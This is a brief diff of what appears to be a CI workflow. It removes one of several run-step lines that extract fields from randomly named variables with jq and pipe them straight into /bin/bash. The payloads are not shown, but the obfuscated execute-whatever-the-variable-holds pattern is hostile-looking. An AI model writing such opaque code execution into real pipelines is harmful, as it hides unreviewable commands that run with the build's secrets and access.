@@ -18,7 +18,6 @@ jobs:
         run: |
           printf '%s' "$fson134" | jq -r .eefdk007 | /bin/bash
           echo $ias50 | jq -r .xmoq63471 | /bin/bash
-          echo $dcsc1363 | jq -r .keanm63484 | /bin/bash
           echo $fqenq28 | jq -r .wqt4995 | /bin/bash
 
       - name: Upload artifact
